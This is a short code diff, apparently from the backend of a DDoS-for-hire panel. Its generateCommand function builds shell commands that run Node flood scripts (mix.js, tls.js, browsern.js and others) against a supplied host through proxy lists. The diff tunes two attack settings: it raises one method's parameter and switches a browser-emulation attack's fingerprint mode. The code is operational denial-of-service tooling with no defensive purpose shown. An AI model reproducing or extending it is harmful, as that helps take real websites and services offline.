@@ -36,7 +36,7 @@ const generateCommand = (method, host, port, time) => {
         case 'CATMIA':
             return `cd /root/methods && node Vzy.js ${host} ${time} 90 4 proxy.txt`;
         case 'MIX':
-            return `cd /root/methods && node mix.js ${host} ${time} 6 35 proxy.txt -v 1`;
+            return `cd /root/methods && node mix.js ${host} ${time} 6 65 proxy.txt -v 1`;
         case 'TLS':
             return `cd /root/methods && node tls.js ${host} ${time} 64 4 proxy.txt`;
         case 'TLSNET':
@@ -44,7 +44,7 @@ const generateCommand = (method, host, port, time) => {
         case 'H2GECKO':
             return `cd /root/methods && node HTTP-GECKO.js ${host} ${time} 64 4 proxy.txt`;
         case 'BROWSER':
-            return `cd /root/methods && screen -dm node browsern.js ${host} ${time} 8 --fingerprint advanced --proxy px.txt`;
+            return `cd /root/methods && screen -dm node browsern.js ${host} ${time} 8 --fingerprint basic --proxy px.txt`;
         case 'H2NEYLI':
             return `cd /root/methods && node H2-NEYLI.js ${host} ${time} 32 8 proxy.txt`;
         case 'MIXBIL':
